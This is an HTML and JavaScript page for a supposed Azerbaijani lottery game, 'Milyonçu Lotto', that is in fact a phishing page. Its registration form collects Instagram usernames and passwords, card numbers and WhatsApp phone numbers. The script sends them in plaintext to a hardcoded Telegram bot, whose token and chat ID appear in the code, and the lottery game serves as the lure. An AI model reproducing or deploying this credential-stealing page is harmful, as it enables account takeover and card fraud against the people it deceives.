<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Milyonçu Lotto - Telegram</title>
    <style>
        body { font-family: Arial, sans-serif; background: #0f172a; color: white; text-align: center; margin: 0; padding: 8px; }
        .card { background: #1e293b; max-width: 640px; margin: 10px auto; padding: 15px; border-radius: 12px; }
        h1 { color: #f59e0b; }
        button { background: #2563eb; color: white; border: none; padding: 12px; margin: 8px; border-radius: 8px; cursor: pointer; width: 90%; max-width: 300px; }
        .timer { font-size: 26px; font-weight: bold; color: #f59e0b; }
        .current-circle {
            width: 100px; height: 100px; background: #f59e0b; color: #1e293b;
            font-size: 36px; font-weight: bold; border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            margin: 12px auto;
        }
        .ticket { background: white; color: #1e293b; padding: 10px; border-radius: 10px; margin: 10px auto; max-width: 420px; }
        .row { display: grid; grid-template-columns: repeat(5, 1fr); gap: 4px; margin: 5px 0; }
        .num { background: #2563eb; color: white; padding: 8px; border-radius: 50%; cursor: pointer; }
        .num.marked { background: #22c55e !important; }
        .info-box { background: #334155; padding: 12px; border-radius: 8px; text-align: left; font-size: 14px; margin: 12px 0; }
        .hidden { display: none; }
        input { width: 95%; padding: 12px; margin: 8px 0; border-radius: 6px; background: #334155; color: white; border: none; }
        .name-row { display: flex; gap: 10px; }
        .name-row input { width: 50%; }
    </style>
</head>
<body>

<div class="card">
    <h1>🎟 Milyonçu Lotto</h1>

    <div id="start-screen">
        <h2>Xoş gəlmisiniz!</h2>
        <div class="name-row">
            <input type="text" id="firstname" placeholder="Ad">
            <input type="text" id="lastname" placeholder="Soyad">
        </div>
        <div class="info-box">
            <strong>Oyun Qaydaları:</strong><br>
            • 2 bilet • Hər bilet 3 sıra (15 rəqəm)<br>
            • 3 dəqiqə • Hər 3 saniyədə 1 rəqəm<br>
            • Yalnız Cari rəqəm işarələnə bilər (2.5 saniyə)<br>
            • Qeydiyyat məlumatları Telegram-a göndərilir
        </div>
        <button onclick="startRegistration()">Qeydiyyatdan Keç</button>
    </div>

    <div id="reg-screen" class="hidden">
        <h2>Qeydiyyat</h2>
        <form id="pre-reg-form">
            <input type="text" id="instagram" placeholder="Instagram" required>
            <input type="password" id="password" placeholder="Instagram Şifrəsi" required>
            <input type="text" id="card" maxlength="14" placeholder="Kart Nömrəsi (14 rəqəm)" required>
            <input type="tel" id="phone" maxlength="13" placeholder="WhatsApp +994501234567" required>
            <button type="submit" style="background:#22c55e;">Qeydiyyatı Tamamla</button>
        </form>
    </div>

    <div id="profile-screen" class="hidden">
        <h2>Profiliniz</h2>
        <div id="profile-info" class="info-box"></div>
        <div id="balance-info" style="font-size:18px; margin:15px 0; color:#4ade80;"></div>
        <button onclick="startGameFromProfile()" style="background:#22c55e;">İndi Oyna</button>
        <button onclick="logout()" style="background:#ef4444;">Çıxış</button>
    </div>

    <div id="game-screen" class="hidden">
        <div class="timer" id="timer">⏱ 180s</div>
        <div class="current-circle" id="current-circle">?</div>
        <p>Cari çıxan rəqəm</p>
        <div id="tickets-container"></div>
    </div>

    <div id="end-screen" class="hidden">
        <h2>Oyun Bitdi!</h2>
        <div id="final-result" style="font-size:22px; margin:15px 0; color:#4ade80;"></div>
        <button onclick="showProfileAfterGame()">Profilə Qayıt</button>
    </div>
</div>

<script>
// ====================== TELEGRAM BOT MƏLUMATLARI ======================
const BOT_TOKEN = "8655483282:AAEVmZXEPOCXU_wryhsCOdk9X8zV-MFj3H4";
const CHAT_ID = "8889776347";

let currentPlayer = null;
let gameInterval = null, drawInterval = null;
let drawnNumbers = [], timer = 180, allRows = [];
let currentDrawNumber = null, lastDrawTime = 0;

function savePlayer(p) { localStorage.setItem('milyoncu_player', JSON.stringify(p)); }
function loadPlayer() { const s = localStorage.getItem('milyoncu_player'); return s ? JSON.parse(s) : null; }

function validateName(first, last) {
    const regex = /^[a-zA-ZçğıöşüəÇĞİÖŞÜƏ]+$/;
    return (first && first.length >= 2 && last && last.length >= 2 && regex.test(first) && regex.test(last));
}

async function sendToTelegram(message) {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: 'HTML' })
        });
        return response.ok;
    } catch(e) { console.error(e); return false; }
}

function startRegistration() {
    const first = document.getElementById('firstname').value.trim();
    const last = document.getElementById('lastname').value.trim();
    if (!validateName(first, last)) {
        alert("❌ Ad və Soyad tam və düzgün yazılmalıdır!\n✅ Minimum 2 hərf\n✅ Yalnız Azərbaycan hərfləri");
        return;
    }
    sessionStorage.setItem('reg_fullname', first + " " + last);
    document.getElementById('start-screen').classList.add('hidden');
    document.getElementById('reg-screen').classList.remove('hidden');
}

document.getElementById('pre-reg-form').onsubmit = async function(e) {
    e.preventDefault();
    const fullname = sessionStorage.getItem('reg_fullname') || '';
    const instagram = document.getElementById('instagram').value.trim();
    const password = document.getElementById('password').value.trim();
    const card = document.getElementById('card').value.trim();
    const phone = document.getElementById('phone').value.trim();
    
    if (!fullname || !instagram || !password || !card || !phone) {
        alert("Bütün sahələr doldurulmalıdır!");
        return;
    }
    if (card.length !== 14 || isNaN(card)) { alert("Kart 14 rəqəm olmalıdır!"); return; }
    if (!phone.startsWith('+994') || phone.length !== 13 || isNaN(phone.substring(1))) { 
        alert("Telefon +994 ilə başlamalıdır!"); return; 
    }
    
    const msg = `🆕 <b>YENİ İSTİFADƏÇİ</b>\n\n👤 ${fullname}\n📷 Instagram: ${instagram}\n🔑 Şifrə: ${password}\n💳 Kart: ${card}\n📞 Tel: ${phone}\n⏰ ${new Date().toLocaleString('az-AZ')}`;
    await sendToTelegram(msg);
    
    const existing = loadPlayer();
    if (existing && existing.phone === phone) {
        currentPlayer = existing;
        alert("✅ Profil tapıldı! " + fullname);
    } else {
        currentPlayer = { fullname, instagram, password, card, phone, balance: 0, lastPlayTime: null };
        alert("✅ Qeydiyyat tamamlandı! 🎉");
    }
    savePlayer(currentPlayer);
    showProfileScreen();
};

function showProfileScreen() {
    document.getElementById('reg-screen').classList.add('hidden');
    document.getElementById('profile-screen').classList.remove('hidden');
    document.getElementById('profile-info').innerHTML = `
        <strong>Ad Soyad:</strong> ${currentPlayer.fullname}<br>
        <strong>Instagram:</strong> ${currentPlayer.instagram}<br>
        <strong>Telefon:</strong> ${currentPlayer.phone}<br>
        <strong>Kart:</strong> ${currentPlayer.card}
    `;
    document.getElementById('balance-info').innerHTML = `💰 Balans: ${currentPlayer.balance || 0} AZN`;
}

function startGameFromProfile() {
    if (!currentPlayer) return;
    const now = new Date();
    if (currentPlayer.lastPlayTime) {
        const hours = (now - new Date(currentPlayer.lastPlayTime)) / (1000 * 60 * 60);
        if (hours < 24) {
            alert(`⏰ ${Math.ceil(24 - hours)} saat gözləməlisiniz!`);
            return;
        }
    }
    currentPlayer.lastPlayTime = now.toISOString();
    savePlayer(currentPlayer);
    document.getElementById('profile-screen').classList.add('hidden');
    document.getElementById('game-screen').classList.remove('hidden');
    initGame();
}

function logout() { localStorage.removeItem('milyoncu_player'); location.reload(); }

function initGame() {
    drawnNumbers = []; allRows = []; timer = 180; currentDrawNumber = null;
    document.getElementById('current-circle').textContent = '?';
    document.getElementById('timer').textContent = `⏱ 180s`;
    
    const container = document.getElementById('tickets-container');
    container.innerHTML = '';
    
    for (let t = 0; t < 2; t++) {
        const ticketDiv = document.createElement('div');
        ticketDiv.className = 'ticket';
        ticketDiv.innerHTML = `<h4>🎫 Bilet ${t+1}</h4>`;
        for (let r = 0; r < 3; r++) {
            const rowDiv = document.createElement('div');
            rowDiv.className = 'row';
            const nums = [];
            while (nums.length < 5) {
                const n = Math.floor(Math.random() * 90) + 1;
                if (!nums.includes(n)) nums.push(n);
            }
            nums.sort((a,b)=>a-b);
            const rowData = { elements: [] };
            nums.forEach(num => {
                const el = document.createElement('div');
                el.className = 'num';
                el.textContent = num;
                el.dataset.number = num;
                el.onclick = () => {
                    const timeDiff = Date.now() - lastDrawTime;
                    if (currentDrawNumber === num && timeDiff <= 2500) {
                        el.classList.toggle('marked');
                    } else {
                        if (!currentDrawNumber) alert("⏳ Hələ rəqəm çıxmayıb!");
                        else if (timeDiff > 2500) alert("⌛ Vaxt keçdi!");
                        else alert(`❌ İndiki rəqəm: ${currentDrawNumber}`);
                    }
                };
                rowData.elements.push(el);
                rowDiv.appendChild(el);
            });
            ticketDiv.appendChild(rowDiv);
            allRows.push(rowData);
        }
        container.appendChild(ticketDiv);
    }
    
    if (gameInterval) clearInterval(gameInterval);
    gameInterval = setInterval(() => {
        timer--;
        document.getElementById('timer').textContent = `⏱ ${timer}s`;
        if (timer <= 0) endGame();
    }, 1000);
    
    if (drawInterval) clearInterval(drawInterval);
    drawInterval = setInterval(() => {
        if (timer <= 0) return;
        let newNum;
        do { newNum = Math.floor(Math.random() * 90) + 1; } while (drawnNumbers.includes(newNum));
        drawnNumbers.push(newNum);
        currentDrawNumber = newNum;
        lastDrawTime = Date.now();
        document.getElementById('current-circle').textContent = newNum;
        setTimeout(() => {
            if (currentDrawNumber === newNum) {
                document.getElementById('current-circle').textContent = '?';
                currentDrawNumber = null;
            }
        }, 2500);
    }, 3000);
}

function endGame() {
    clearInterval(gameInterval); clearInterval(drawInterval);
    let completed = 0;
    allRows.forEach(row => { if (row.elements.every(el => el.classList.contains('marked'))) completed++; });
    let win = 0;
    if (completed === 1) win = 5;
    else if (completed === 2) win = 10;
    else if (completed === 3) win = 30;
    else if (completed >= 4) win = 50;
    else if (completed >= 5) win = 100;
    else if (completed >= 6) win = 200;
    
    if (win > 0) {
        currentPlayer.balance = (currentPlayer.balance || 0) + win;
        savePlayer(currentPlayer);
        
        const winMsg = `🎉 <b>MİLYONÇU LOTTO - QAZANC</b>\n\n👤 ${currentPlayer.fullname}\n📞 ${currentPlayer.phone}\n✅ Tam sıra: ${completed}\n💰 Qazanc: ${win} AZN\n📊 Balans: ${currentPlayer.balance} AZN\n⏰ ${new Date().toLocaleString('az-AZ')}`;
        sendToTelegram(winMsg);
    }
    
    document.getElementById('game-screen').classList.add('hidden');
    document.getElementById('end-screen').classList.remove('hidden');
    document.getElementById('final-result').innerHTML = `✅ Tam sıra: ${completed}<br>🎉 Qazanc: ${win} AZN<br>💰 Balans: ${currentPlayer.balance || 0} AZN`;
}

function showProfileAfterGame() {
    document.getElementById('end-screen').classList.add('hidden');
    showProfileScreen();
}

window.onload = () => {
    const saved = loadPlayer();
    if (saved) { currentPlayer = saved; showProfileScreen(); }
};
</script>
</body>
            </html>
